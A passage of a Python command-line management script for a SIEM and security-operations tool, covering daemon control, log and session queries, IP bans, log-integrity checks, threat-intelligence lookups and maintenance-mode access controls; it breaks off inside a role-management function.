# -*- coding: utf-8 -*-
"""
==============================================================================
ENTERPRISE SIEM MANAGEMENT & INTERACTIVE SOC CLI CONTROLLER (manage.py)
==============================================================================
Comprehensive CLI suite for daemon management, testing, live monitoring,
user action auditing, threat intelligence queries, and perimeter defense.

COMMANDS SUMMARY:
  1. DAEMON LIFECYCLE    : start, stop, restart, audit
  2. TESTING & SIMULATION : test, benchmark, simulate, simulate-shell
  3. LOGS & AUDITING     : logs, user-audit, tail, verify-integrity, export-report
  4. SECURITY & CTI      : cti-check, dga-check, risk, memory-scan
  5. FIREWALL & SESSIONS : status, monitor (top), ban, unban, unban-all, list-bans, sessions
  6. DATASET & TRAINING  : generate-dataset, train-models
==============================================================================
"""

import os
import sys
import time
import json
import psutil
import subprocess
import argparse
from datetime import datetime

# Ensure UTF-8 stdout encoding across all terminals (Windows CP1254/CP437 & Linux)
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        sys.stderr.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

# Add project root to sys.path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

import config
from modules.ban_manager import BanManager
from modules.db_manager import get_db_connection
from modules.smart_logger import SmartLogger
from modules.integrity_guard import LogIntegrityGuard

# ==============================================================================
# HELPER FORMATTING FUNCTIONS
# ==============================================================================

def render_progress_bar(percent: float, width: int = 16) -> str:
    """Renders a clean ASCII progress bar: [########--------]"""
    p = max(0.0, min(100.0, percent))
    filled_len = int(round(width * p / 100.0))
    bar = "#" * filled_len + "-" * (width - filled_len)
    return f"[{bar}] {p:>5.1f}%"

def format_countdown(unban_at: float, now: float) -> str:
    """Formats remaining ban seconds into mm:ss or hh:mm format."""
    remaining = max(0, int(unban_at - now))
    if remaining >= 3600:
        h = remaining // 3600
        m = (remaining % 3600) // 60
        return f"{h:02d}h {m:02d}m"
    else:
        m = remaining // 60
        s = remaining % 60
        return f"{m:02d}m {s:02d}s"

# ==============================================================================
# 1. DAEMON LIFECYCLE COMMANDS (start, stop, restart, audit)
# ==============================================================================

def start_daemon_cmd(mode="production", daemon=False, port=None):
    """Starts the SIEM engine in production or warning-only mode."""
    target_script = "main.py" if mode == "production" else "main_warning_only.py"
    cmd = [sys.executable, target_script]
    if port:
        os.environ["SIEM_SYSLOG_PORT"] = str(port)

    print(f"[*] Launching Enterprise SIEM Engine in [{mode.upper()}] mode...")
    if daemon:
        if os.name == "nt":
            # On Windows, spawn background process using creationflags
            DETACHED_PROCESS = 0x00000008
            proc = subprocess.Popen(cmd, creationflags=DETACHED_PROCESS, close_fds=True)
        else:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
        print(f"[OK] SIEM Daemon started in background (PID: {proc.pid}).")
    else:
        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            print("\n[*] SIEM Process terminated cleanly.")

def stop_daemon_cmd():
    """Stops all running SIEM engine background processes."""
    print("[*] Searching for active SIEM processes...")
    current_pid = os.getpid()
    killed = 0
    for p in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if p.pid == current_pid:
                continue
            cmdline = " ".join(p.info.get('cmdline') or [])
            if any(target in cmdline for target in ["main.py", "main_warning_only.py", "siem-monitor"]):
                p.terminate()
                try:
                    p.wait(timeout=2)
                except psutil.TimeoutExpired:
                    p.kill()
                print(f"[+] Terminated SIEM process (PID: {p.pid})")
                killed += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass

    if killed > 0:
        print(f"[OK] Successfully stopped {killed} SIEM process(es).")
    else:
        print("[OK] No active SIEM processes found running.")

def restart_daemon_cmd(mode="production"):
    """Restarts the SIEM engine."""
    stop_daemon_cmd()
    time.sleep(1.0)
    start_daemon_cmd(mode=mode, daemon=True)

# ==============================================================================
# 2. TESTING & SIMULATION COMMANDS (test, benchmark, simulate, simulate-shell)
# ==============================================================================

def run_tests_cmd(section=None, verbose=False):
    """Executes the automated 17-point SIEM verification suite."""
    test_path = os.path.join("tests", "test_enterprise_siem.py")
    if not os.path.exists(test_path):
        test_path = "test_enterprise_siem.py"
    
    cmd = [sys.executable, test_path]
    print(f"[*] Running Enterprise Verification Suite ({test_path})...\n")
    subprocess.run(cmd)

def run_benchmark_cmd():
    """Executes the 25 ground-truth machine learning benchmark suite."""
    bench_path = os.path.join("tests", "test_colab.py")
    if not os.path.exists(bench_path):
        bench_path = "test_colab.py"
    
    cmd = [sys.executable, bench_path]
    print(f"[*] Running AI Security Benchmark Suite ({bench_path})...\n")
    subprocess.run(cmd)

def run_benchmark_1000_cmd():
    """Executes the 1,000 scenario multi-vector stress-test benchmark suite."""
    bench_path = os.path.join("tests", "test_colab.py")
    if not os.path.exists(bench_path):
        bench_path = "test_colab.py"
    
    cmd = [sys.executable, bench_path, "--1000"]
    print(f"[*] Running 1,000 Scenario Enterprise Stress-Test Benchmark ({bench_path})...\n")
    subprocess.run(cmd)

def run_benchmark_10000_cmd():
    """Executes the 10,000 scenario realistic enterprise stress-test benchmark suite."""
    bench_path = os.path.join("tests", "benchmark_10000.py")
    if not os.path.exists(bench_path):
        bench_path = "build_10000.py"
    
    cmd = [sys.executable, bench_path]
    print(f"[*] Running 10,000 Scenario Enterprise Realistic Stress-Test Benchmark ({bench_path})...\n")
    subprocess.run(cmd)

def simulate_command_cmd(command_str):
    """Evaluates a single command string through the AI Security Engine in dry-run mode."""
    from modules.ai_security_engine import AISecurityEngine
    from modules.canonicalizer import PayloadCanonicalizer
    from simulate_test import evaluate_command, print_result

    print("\n" + "=" * 78)
    print("           DRY-RUN SECURITY SIMULATION & AI INFERENCE")
    print("=" * 78)
    res = evaluate_command(command_str)
    print_result(res)
    print("=" * 78 + "\n")

def simulate_shell_cmd():
    """Opens interactive threat simulation REPL."""
    from simulate_test import interactive_mode
    interactive_mode()

# ==============================================================================
# 3. LOGS & AUDIT COMMANDS (status, logs, user-audit, tail, verify-integrity, export-report)
# ==============================================================================

def show_status():
    """Displays live system hardware utilization, active bans, and sessions."""
    now = time.time()
    bm = BanManager()

    print("\n" + "=" * 78)
    print("           SIEM SECURITY & SYSTEM MONITORING STATUS REPORT")
    print("=" * 78)

    # 1. Hardware Resource Utilization
    cpu_percent = psutil.cpu_percent(interval=0.5)
    ram = psutil.virtual_memory()
    disk = psutil.disk_usage("/") if os.name != 'nt' else psutil.disk_usage("C:\\")

    print(f"[*] CPU Utilization   : {render_progress_bar(cpu_percent)}")
    print(f"[*] RAM Utilization   : {render_progress_bar(ram.percent)} ({ram.used // (1024*1024)} MB / {ram.total // (1024*1024)} MB)")
    print(f"[*] Disk Utilization  : {render_progress_bar(disk.percent)} ({disk.free // (1024*1024*1024)} GB Free Space)")

    # 2. Database & Active Firewall Bans
    active_bans = []
    try:
        with get_db_connection("security_events.db") as conn:
            cursor = conn.cursor()
            cursor.execute("""SELECT ip, network_type, criticality_level, reason, unban_at 
                              FROM banned_ips WHERE is_active = 1 AND unban_at > ?""", (now,))
            active_bans = cursor.fetchall()
    except Exception as e:
        print(f"[-] DB Query Error: {e}")

    print("\n" + "-" * 78)
    print(f"  ACTIVE FIREWALL RESTRICTIONS (TOTAL ACTIVE BANS: {len(active_bans)})")
    print("-" * 78)
    if active_bans:
        print(f"{'Target (IP/CIDR)':<22} {'Network':<10} {'Level':<10} {'Remaining':<12} {'Reason'}")
        print("-" * 78)
        for ip, net, crit, reason, unban_at in active_bans:
            rem_str = format_countdown(unban_at, now)
            print(f"{ip:<22} {net:<10} {crit:<10} {rem_str:<12} {reason[:26]}")
    else:
        print("  [OK] No active IP bans currently in effect. System clean.")

    # 3. Active Terminal Sessions
    active_sessions = []
    try:
        with get_db_connection("security_events.db") as conn:
            cursor = conn.cursor()
            cursor.execute("""SELECT username, source_ip, tty_device, total_commands, last_activity_time 
                              FROM user_sessions WHERE status = 'ACTIVE'""")
            active_sessions = cursor.fetchall()
    except Exception:
        pass

    print("\n" + "-" * 78)
    print(f"  ACTIVE USER SESSIONS (TOTAL SESSIONS: {len(active_sessions)})")
    print("-" * 78)
    if active_sessions:
        print(f"{'Username':<15} {'Source IP':<20} {'Terminal':<10} {'Cmds':<6} {'Last Activity'}")
        print("-" * 78)
        for u, ip, tty, cmds, last_act in active_sessions:
            idle_mins = int((now - last_act) // 60)
            print(f"{u:<15} {ip:<20} {tty:<10} {cmds:<6} {idle_mins} mins ago")
    else:
        print("  [OK] No active user sessions detected.")

    print("=" * 78 + "\n")

def list_logs_cmd(limit=20, level=None, event_type=None, as_json=False):
    """Queries security activity logs with optional filters."""
    query = "SELECT timestamp, level, status, module, event_type, target, summary, mitre_id, ai_verdict FROM activity_logs WHERE 1=1"
    params = []
    if level:
        query += " AND level = ?"
        params.append(level.upper())
    if event_type:
        query += " AND event_type LIKE ?"
        params.append(f"%{event_type}%")
    query += " ORDER BY id DESC LIMIT ?"
    params.append(limit)

    try:
        with get_db_connection("security_events.db") as conn:
            cursor = conn.cursor()
            cursor.execute(query, tuple(params))
            rows = cursor.fetchall()

            if as_json:
                data = [{"timestamp": r[0], "level": r[1], "status": r[2], "module": r[3], "event_type": r[4], "target": r[5], "summary": r[6], "mitre_id": r[7], "ai_verdict": r[8]} for r in rows]
                print(json.dumps(data, indent=2))
                return

            print("\n" + "=" * 90)
            print(f"                 SECURITY EVENT ACTIVITY LOGS (LAST {len(rows)} EVENTS)")
            print("=" * 90)
            print(f"{'TIMESTAMP':<20} {'LEVEL':<9} {'MODULE':<14} {'TARGET':<16} {'MITRE':<8} {'SUMMARY'}")
            print("-" * 90)
            for ts, lvl, st, mod, ev, tgt, summ, mitre, ai_v in rows:
                print(f"{ts:<20} {lvl:<9} {mod:<14} {tgt:<16} {mitre:<8} {summ[:25]}")
            print("=" * 90 + "\n")
    except Exception as e:
        print(f"[-] Query Logs Error: {e}")

def user_audit_cmd(user=None, limit=20):
    """Displays human-readable user actions, target files, and services."""
    query = "SELECT timestamp, username, source_ip, tty, action_type, target_service, target_file, command, status, summary, risk_level FROM user_action_audit WHERE 1=1"
    params = []
    if user:
        query += " AND username = ?"
        params.append(user)
    query += " ORDER BY id DESC LIMIT ?"
    params.append(limit)

    try:
        with get_db_connection("security_events.db") as conn:
            cursor = conn.cursor()
            cursor.execute(query, tuple(params))
            rows = cursor.fetchall()

            print("\n" + "=" * 95)
            print("                  USER ACTION, FILE & SERVICE AUDIT LOG")
            print("=" * 95)
            if not rows:
                print("  [OK] No user action records found.")
            for ts, u, ip, tty, act, svc, f_path, cmd, st, summ, risk in rows:
                print(f"[{ts}] [USER: {u}] [IP: {ip}] [TTY: {tty}] -> {act} ({risk})")
                print(f"  |-- TARGET SERVICE : {svc}")
                print(f"  |-- AFFECTED FILE  : {f_path}")
                print(f"  |-- COMMAND        : {cmd}")
                print(f"  \\-- SUMMARY        : {summ}\n")
            print("=" * 95 + "\n")
    except Exception as e:
        print(f"[-] User Audit Query Error: {e}")

def tail_logs_cmd(follow=False, lines=15):
    """Tails the human-readable activity log."""
    log_path = os.path.join("logs", "readable_activity.log")
    if not os.path.exists(log_path):
        print(f"[-] Log file not found: {log_path}")
        return

    with open(log_path, "r", encoding="utf-8", errors="ignore") as f:
        all_lines = f.readlines()
        tail = all_lines[-lines:] if len(all_lines) >= lines else all_lines
        for l in tail:
            sys.stdout.write(l)
        sys.stdout.flush()

        if follow:
            try:
                while True:
                    line = f.readline()
                    if line:
                        sys.stdout.write(line)
                        sys.stdout.flush()
                    else:
                        time.sleep(0.5)
            except KeyboardInterrupt:
                print("\n[*] Tail stopped.")

def verify_log_integrity_cmd(log_path="logs/activity_records.jsonl"):
    """Verifies HMAC-SHA256 log chain integrity."""
    guard = LogIntegrityGuard()
    print("\n" + "=" * 78)
    print("      CRYPTOGRAPHIC HMAC-SHA256 LOG INTEGRITY & ANTI-TAMPER AUDIT")
    print("=" * 78)
    print(f"[*] Target Log File : {log_path}")

    is_valid, total_checked, broken_line, msg = guard.verify_jsonl_log_file(log_path)
    if is_valid:
        print(f"[*] Records Verified: {total_checked:,} entries checked.")
        print(f"[OK] VERIFICATION PASSED: {msg}")
        print("[OK] Blockchain Hash Chain is 100% INTACT. Zero tampering detected.")
    else:
        print(f"[!] VERIFICATION FAILED: Corrupted or tampered at Line {broken_line}!")
        print(f"    Error Details: {msg}")
    print("=" * 78 + "\n")

def export_report(output_file="siem_security_report.json"):
    """Exports structured metrics as JSON."""
    try:
        bm = BanManager()
        categories = {}
        with get_db_connection("security_events.db") as conn:
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT event_type, COUNT(*) FROM activity_logs GROUP BY event_type")
                for cat, count in cursor.fetchall():
                    categories[cat] = count
            except Exception:
                pass

        report_data = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "active_bans_count": len(bm.active_bans),
            "active_bans_list": list(bm.active_bans.keys()),
            "hardware": {
                "cpu_percent": psutil.cpu_percent(interval=None),
                "ram_percent": psutil.virtual_memory().percent,
                "disk_percent": psutil.disk_usage('/').percent if os.name != 'nt' else psutil.disk_usage('C:\\').percent
            },
            "threat_categories": categories,
            "system_status": "OPERATIONAL"
        }

        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        print(f"[OK] Security Report Exported Successfully: {output_file}")
    except Exception as e:
        print(f"[-] Export Report Error: {e}")

# ==============================================================================
# 4. SECURITY & THREAT INTELLIGENCE (cti-check, dga-check, risk, memory-scan)
# ==============================================================================

def cti_check_cmd(target):
    """Checks an IP or domain against the Cyber Threat Intelligence (CTI) database."""
    from modules.cti_matcher import cti_matcher
    print(f"\n[*] Querying CTI Threat Intelligence Database for '{target}'...")
    hit = cti_matcher.match_ip(target) if (target.replace(".", "").isdigit() or ":" in target) else cti_matcher.match_domain(target)
    if hit:
        print(f"[!] [THREAT MATCH DETECTED] Target: {target}")
        print(f"    |-- Threat Type : {hit.get('threat')}")
        print(f"    |-- Confidence  : {hit.get('confidence')}%")
        print(f"    \\-- Source Feed : {hit.get('source')}\n")
    else:
        print(f"[OK] Clean: Target '{target}' not found in known CTI threat feeds.\n")

def dga_check_cmd(domain):
    """Analyzes a domain using the DGA detection engine (Shannon Entropy)."""
    from modules.dga_detector import dga_detector
    res = dga_detector.analyze(domain)
    print(f"\n[*] DGA Analysis for Domain: {domain}")
    print(f"    |-- Is DGA       : {res['is_dga']}")
    print(f"    |-- DGA Score    : {res['score']:.1f} / 100")
    print(f"    |-- Entropy      : {res['entropy']:.3f}")
    print(f"    |-- Vowel Ratio  : {res.get('vowel_ratio', 0.0):.3f}")
    print(f"    \\-- Digit Ratio  : {res.get('digit_ratio', 0.0):.3f}\n")

def risk_cmd(entity, add_points=None, reason="Manual Risk Adjustment", is_host=False):
    """Views or updates the dynamic risk score for an entity."""
    from modules.risk_scorer import risk_scorer
    if add_points:
        res = risk_scorer.add_risk(entity, float(add_points), reason, is_user=not is_host)
        print(f"[+] Added {add_points} risk points to {'Host' if is_host else 'User'} '{entity}'.")
        print(f"    New Score: {res['score']:.1f}/100 | Tier: {res['tier']}")
    else:
        score = risk_scorer.get_risk(entity, is_user=not is_host)
        tier = risk_scorer.get_tier(score)
        print(f"[*] Entity: {entity} | Score: {score:.1f}/100 | Tier: {tier}")

def memory_scan_cmd(pid=None):
    """Runs on-demand memory maps RWX and YARA scanner."""
    from modules.memory_threat_hunter import memory_threat_hunter
    if pid:
        print(f"[*] Triggering Memory & YARA Scan on PID: {pid}...")
        findings = memory_threat_hunter.scan_process(int(pid))
        if findings:
            for f in findings:
                print(f"[!] [THREAT FOUND] PID {pid} -> {f['rule_name']} ({f['threat_type']})")
        else:
            print(f"[OK] PID {pid} memory clean. Zero malicious patterns detected.")
    else:
        print("[*] Running Full System Memory Scan across active processes...")
        total_scanned = memory_threat_hunter.scan_all_running_processes()
        print(f"[OK] Full memory sweep complete ({total_scanned} processes audited).")

# ==============================================================================
# 5. PERIMETER & SESSION CONTROLLER (monitor, ban, unban, unban-all, list-bans, sessions)
# ==============================================================================

def run_live_monitor():
    """Runs the real-time interactive terminal SOC dashboard."""
    clear_cmd = "cls" if os.name == "nt" else "clear"
    try:
        while True:
            now = time.time()
            cpu_percent = psutil.cpu_percent(interval=None)
            ram = psutil.virtual_memory()
            disk = psutil.disk_usage("/") if os.name != 'nt' else psutil.disk_usage("C:\\")

            active_bans = []
            recent_logs = []
            active_sessions = []

            try:
                with get_db_connection("security_events.db") as conn:
                    cursor = conn.cursor()
                    cursor.execute("""SELECT ip, network_type, criticality_level, reason, unban_at 
                                      FROM banned_ips WHERE is_active = 1 AND unban_at > ? ORDER BY unban_at DESC LIMIT 8""", (now,))
                    active_bans = cursor.fetchall()

                    cursor.execute("""SELECT username, source_ip, tty_device, total_commands, last_activity_time 
                                      FROM user_sessions WHERE status = 'ACTIVE' LIMIT 5""")
                    active_sessions = cursor.fetchall()

                    cursor.execute("""SELECT timestamp, level, event_type, target, mitre_id 
                                      FROM activity_logs ORDER BY id DESC LIMIT 5""")
                    recent_logs = cursor.fetchall()
            except Exception:
                pass

            os.system(clear_cmd)
            t_str = time.strftime("%Y-%m-%d %H:%M:%S")

            print("+" + "=" * 76 + "+")
            print(f"|   ENTERPRISE SIEM & SOC REAL-TIME INTERACTIVE DASHBOARD                    |")
            print(f"|   Time: {t_str} | Refresh: 1.0s | Press Ctrl+C to Exit              |")
            print("+" + "=" * 76 + "+")

            print(f" [HARDWARE UTILIZATION]")
            print(f"  CPU Usage : {render_progress_bar(cpu_percent, 20)}  |  Cores: {psutil.cpu_count(logical=True)}")
            print(f"  RAM Usage : {render_progress_bar(ram.percent, 20)}  |  Used : {ram.used // (1024*1024)}MB / {ram.total // (1024*1024)}MB")
            print(f"  Disk Space: {render_progress_bar(disk.percent, 20)}  |  Free : {disk.free // (1024*1024*1024)}GB")

            print("\n" + "-" * 78)
            print(f" [ACTIVE FIREWALL RESTRICTIONS] ({len(active_bans)} Active)")
            print("-" * 78)
            if active_bans:
                print(f" {'Target (IP/CIDR)':<22} {'Network':<10} {'Level':<10} {'Countdown':<12} {'Reason'}")
                print(" " + "-" * 76)
                for ip, net, crit, reason, unban_at in active_bans:
                    rem_str = format_countdown(unban_at, now)
                    print(f" {ip:<22} {net:<10} {crit:<10} {rem_str:<12} {reason[:24]}")
            else:
                print("  [OK] No active firewall bans. Perimeter clean.")

            print("\n" + "-" * 78)
            print(f" [ACTIVE USER TERMINAL SESSIONS] ({len(active_sessions)} Active)")
            print("-" * 78)
            if active_sessions:
                print(f" {'Username':<14} {'Source IP':<20} {'TTY':<10} {'Cmds':<6} {'Inactivity'}")
                print(" " + "-" * 76)
                for u, ip, tty, cmds, last_act in active_sessions:
                    idle_s = int(now - last_act)
                    idle_fmt = f"{idle_s//60}m {idle_s%60}s"
                    print(f" {u:<14} {ip:<20} {tty:<10} {cmds:<6} {idle_fmt}")
            else:
                print("  [OK] No interactive terminal sessions active.")

            print("\n" + "-" * 78)
            print(" [LIVE SECURITY EVENT STREAM - LAST 5 EVENTS]")
            print("-" * 78)
            if recent_logs:
                for ts, lvl, ev, tgt, mitre in recent_logs:
                    short_ts = ts.split()[-1] if " " in ts else ts
                    mitre_str = f"[{mitre}]" if mitre and mitre != "N/A" else ""
                    print(f"  {short_ts} [{lvl:<8}] {ev:<28} Target: {tgt:<16} {mitre_str}")
            else:
                print("  [*] Awaiting incoming security events...")

            print("+" + "=" * 76 + "+")
            time.sleep(1.0)
    except KeyboardInterrupt:
        print("\n[*] Live Dashboard Exited Cleanly.")

def ban_ip_cmd(ip, duration=None, criticality="CRITICAL", reason="Manual Admin Ban"):
    bm = BanManager()
    bm.ban_ip(ip=ip, criticality=criticality, reason=reason, duration_override=duration)
    print(f"[OK] Target {ip} successfully banned on firewall.")

def unban_ip_cmd(ip):
    bm = BanManager()
    if ip.lower() in ["all", "--all"]:
        bm.unban_all(reason="Manual Admin Master Flush")
    else:
        bm.unban_ip(ip=ip, reason="Manual Admin Unban")
    print(f"[OK] Restriction lifted for target {ip}.")

def unban_all_cmd():
    bm = BanManager()
    bm.unban_all(reason="Manual Admin Master Flush")
    print("[OK] All firewall restrictions and database bans successfully cleared.")

def list_all_bans(active_only=False, limit=20):
    try:
        with get_db_connection("security_events.db") as conn:
            cursor = conn.cursor()
            query = "SELECT ip, reason, criticality_level, banned_at, unban_at, is_active FROM banned_ips"
            if active_only:
                query += " WHERE is_active = 1 AND unban_at > ?"
                cursor.execute(query + " ORDER BY id DESC LIMIT ?", (time.time(), limit))
            else:
                cursor.execute(query + " ORDER BY id DESC LIMIT ?", (limit,))
            rows = cursor.fetchall()
            
            print("\n" + "=" * 78)
            print("                RECENT & ACTIVE FIREWALL RESTRICTIONS")
            print("=" * 78)
            print(f" {'IP / CIDR':<20} {'LEVEL':<10} {'STATUS':<10} {'REASON':<36}")
            print("-" * 78)
            if rows:
                for ip, reason, crit, b_at, u_at, is_act in rows:
                    status = "ACTIVE" if is_act == 1 and u_at > time.time() else "EXPIRED"
                    print(f" {ip:<20} {crit:<10} {status:<10} {reason[:35]:<36}")
            else:
                print("  [OK] No ban records found.")
            print("=" * 78 + "\n")
    except Exception as e:
        print(f"[-] Query Bans Error: {e}")

def sessions_cmd(kill_target=None):
    """Lists or terminates active user terminal sessions."""
    if kill_target:
        from modules.user_session_tracker import user_session_tracker
        user_session_tracker.terminate_session_now(kill_target)
        print(f"[OK] Session termination dispatched for '{kill_target}'.")
    else:
        try:
            with get_db_connection("security_events.db") as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT session_id, username, source_ip, tty_device, start_time, total_commands, status FROM user_sessions WHERE status = 'ACTIVE'")
                rows = cursor.fetchall()
                print("\n" + "=" * 85)
                print("                    ACTIVE USER TERMINAL SESSIONS")
                print("=" * 85)
                if rows:
                    print(f" {'SESSION ID':<15} {'USER':<12} {'SOURCE IP':<18} {'TTY':<8} {'COMMANDS':<10} {'STATUS'}")
                    print("-" * 85)
                    for sid, u, ip, tty, st, cmds, status in rows:
                        print(f" {sid:<15} {u:<12} {ip:<18} {tty:<8} {cmds:<10} {status}")
                else:
                    print("  [OK] Zero active terminal sessions.")
                print("=" * 85 + "\n")
        except Exception as e:
            print(f"[-] Query Sessions Error: {e}")

# ==============================================================================
# 6. DATASET & MODEL TRAINING SHORTCUTS (generate-dataset, train-models)
def generate_dataset_cmd(samples=5000, output="data/dataset.jsonl"):
    """Generates synthetic combinatorial log datasets."""
    from tools.generate_dataset import generate_streaming_dataset
    generate_streaming_dataset(total_samples=samples, output_path=output)

def train_models_cmd(dataset="data/dataset.jsonl", batch_size=50000):
    """Trains Pure-NumPy Ensembles & Autoencoder on streaming dataset."""
    from tools.train_ai_models import train_streaming_ensemble, train_streaming_autoencoder
    train_streaming_ensemble(dataset_path=dataset, batch_size=batch_size)
    train_streaming_autoencoder(dataset_path=dataset, batch_size=batch_size)

def doctor_cmd():
    """Runs a complete self-diagnostic health check across all SIEM engines."""
    print("=" * 75)
    print("       ENTERPRISE SIEM SYSTEM DOCTOR & ENVIRONMENT DIAGNOSTICS")
    print("=" * 75)
    
    import platform
    print(f"[*] OS Platform        : {platform.system()} {platform.release()} ({platform.machine()})")
    print(f"[*] Python Version     : {platform.python_version()} ({sys.executable})")
    
    db_path = os.path.abspath("security_events.db")
    try:
        with get_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("PRAGMA journal_mode;")
            jmode = cursor.fetchone()[0]
            cursor.execute("SELECT count(*) FROM banned_ips;")
            ban_cnt = cursor.fetchone()[0]
            cursor.execute("SELECT count(*) FROM activity_logs;")
            log_cnt = cursor.fetchone()[0]
            print(f"[OK] SQLite DB Engine  : WAL Mode ({jmode.upper()}) | Active Bans: {ban_cnt} | Logs: {log_cnt} | File: {db_path}")
    except Exception as e:
        print(f"[FAIL] SQLite DB Engine: Error ({e})")

    from modules.ai_security_engine import AISecurityEngine
    try:
        ai = AISecurityEngine()
        loaded = ai.load_all_models()
        if loaded:
            print(f"[OK] AI Security Engine: 4 Ensemble Models + Zero-Day Autoencoder LOADED (Pure-NumPy, Zero PyTorch)")
        else:
            print(f"[WARN] AI Security Engine: Model files missing in models/ directory")
    except Exception as e:
        print(f"[FAIL] AI Security Engine: Error ({e})")

    from modules.ban_manager import BanManager
    try:
        bm = BanManager()
        prot_ips = list(bm.dynamic_protected_ips)[:5]
        print(f"[OK] Perimeter Shield  : Host IPs Whitelisted ({len(bm.dynamic_protected_ips)} protected): {', '.join(prot_ips)}")
    except Exception as e:
        print(f"[FAIL] Perimeter Shield: Error ({e})")

    try:
        cpu = psutil.cpu_percent(interval=0.1)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage('.').percent
        print(f"[OK] System Resources  : CPU: {cpu}% | RAM: {mem}% | Disk: {disk}%")
    except Exception as e:
        print(f"[FAIL] System Resources: Error ({e})")

    try:
        users = psutil.users()
        print(f"[OK] Interactive Users : {len(users)} active user session(s) detected via psutil.")
        for u in users:
            print(f"      - User: {u.name} | TTY: {u.terminal} | Remote Host: {u.host or 'local'}")
    except Exception as e:
        print(f"[WARN] Interactive Users: {e}")

    print("=" * 75)
    print("[+] System Health Status: READY & FULLY OPERATIONAL")
    print("=" * 75)

def scan_cmd(payload: str):
    """Performs deep-dive forensic threat assessment on any command or log string."""
    print("=" * 75)
    print("       DEEP-DIVE FORENSIC THREAT ASSESSMENT & AI INSPECTION")
    print("=" * 75)
    print(f"[*] Target Input       : {payload}")
    
    from modules.ai_security_engine import AISecurityEngine
    from modules.user_session_tracker import UserSessionTracker
    from modules.canonicalizer import PayloadCanonicalizer
    from modules.whitelist_shield import WhitelistShield
    
    canonical = PayloadCanonicalizer.canonicalize(payload)
    print(f"[*] Canonicalized      : {canonical}")
    
    is_whitelisted = WhitelistShield.is_known_benign(payload) or WhitelistShield.is_known_benign(canonical)
    print(f"[*] Whitelist Shield   : {'MATCHED (Known Benign)' if is_whitelisted else 'NONE (Proceeds to Deep Analysis)'}")
    
    ai = AISecurityEngine()
    ai.load_all_models()
    tracker = UserSessionTracker(ai_engine=ai)
    
    cat, score, is_anom, summary, ai_res, urgency = tracker.analyze_command_context("forensic_admin", payload)
    
    verdict = "MALICIOUS / HOSTILE" if (is_anom or score >= 60) else "BENIGN / ALLOWED"
    print("-" * 75)
    print(f"[*] FINAL VERDICT      : {verdict}")
    print(f"[*] Threat Category    : {cat}")
    print(f"[*] Risk Score         : {score}/100")
    print(f"[*] Urgency Level      : {urgency}")
    print(f"[*] Summary            : {summary}")
    if ai_res:
        print(f"[*] AI Anomaly Score   : {ai_res.get('anomaly_score', 0.0):.6f} (Threshold: {ai_res.get('autoencoder_threshold', 0.0):.6f})")
        print(f"[*] AI Probability     : {ai_res.get('confidence_score', 0.0)*100:.1f}%")
        print(f"[*] Threat Title       : {ai_res.get('incident_title', 'N/A')}")
        print(f"[*] MITRE ATT&CK       : {ai_res.get('mitre_id', 'N/A')}")
# ==============================================================================
# 7. MAINTENANCE DEFENSE, RBAC & HONEYPOT CONTROLS
# ==============================================================================

def maintenance_cmd(action="status", reason=None, allowed=None, user=None):
    """Manages Enterprise Maintenance Mode defense and authorized access whitelists."""
    from modules.maintenance_mode import maintenance_manager
    
    if action == "on":
        allowed_list = [u.strip() for u in allowed.split(",")] if allowed else None
        maintenance_manager.enable_maintenance(reason=reason, allowed_users=allowed_list)
        status = maintenance_manager.get_status()
        print("\n=================================================================")
        print("         ENTERPRISE MAINTENANCE DEFENSE ACTIVATED                ")
        print("=================================================================")
        print(f"[*] State             : {status['status']}")
        print(f"[*] Reason            : {status['reason']}")
        print(f"[*] Start Time        : {status['start_time']}")
        print(f"[*] Allowed Users     : {', '.join(status['allowed_users'])}")
        print(f"[*] Allowed Roles     : {', '.join(status['allowed_roles'])}")
        print("[!] All unauthorized user sessions will be blocked and intercepted.")
        print("=================================================================\n")

    elif action == "off":
        maintenance_manager.disable_maintenance()
        print("\n[+] Enterprise Maintenance Mode successfully disabled.")
        print("[+] Standard access permissions restored for all users.\n")

    elif action == "allow":
        if not user:
            print("[-] Error: Specify username to allow (e.g. manage.py maintenance allow --user devops)")
            return
        maintenance_manager.allow_user(user)
        print(f"[OK] User '{user}' added to active maintenance whitelist.")

    elif action == "deny":
        if not user:
            print("[-] Error: Specify username to deny (e.g. manage.py maintenance deny --user intern)")
            return
        maintenance_manager.deny_user(user)
        print(f"[OK] User '{user}' removed from maintenance whitelist.")

    else:
        # Status view
        status = maintenance_manager.get_status()
        print("\n=================================================================")
        print("          ENTERPRISE MAINTENANCE DEFENSE STATUS                  ")
        print("=================================================================")
        print(f"[*] Maintenance Active: {'YES (ENFORCING)' if status['is_enabled'] else 'NO (STANDBY)'}")
        print(f"[*] Window Reason     : {status['reason']}")
        print(f"[*] Activated At      : {status['start_time']}")
        print(f"[*] Active Duration   : {status['active_duration']}")
        print(f"[*] Whitelisted Users : {', '.join(status['allowed_users'])}")
        print(f"[*] Whitelisted Roles : {', '.join(status['allowed_roles'])}")
        print("=================================================================\n")

def auth_cmd(action="list", user=None, role=None):
    """Manages Role-Based Access Control (RBAC) permissions."""
    from modules.maintenance_mode import maintenance_manager
    
    if action == "set-role":
        if not user or not role:
            print("[-] Error: Provide both user and role (e.g. manage.py auth set-role --user john --role AUDITOR)")
            return
        maintenance_manager.set_user_role(user, role)
        print(f"[OK] Assigned role '{role.upper()}' to user '{user}'.")

    elif action == "check":
        if not user:
            print("[-] Error: Specify user to check (e.g. manage.py auth check --user devops)")
            return
        user_role = maintenance_manager.get_user_role(user)
        is_maint_auth = maintenance_manager.is_user_authorized(user)
        print(f"\n[*] User: {user} | Assigned Role: {user_role}")
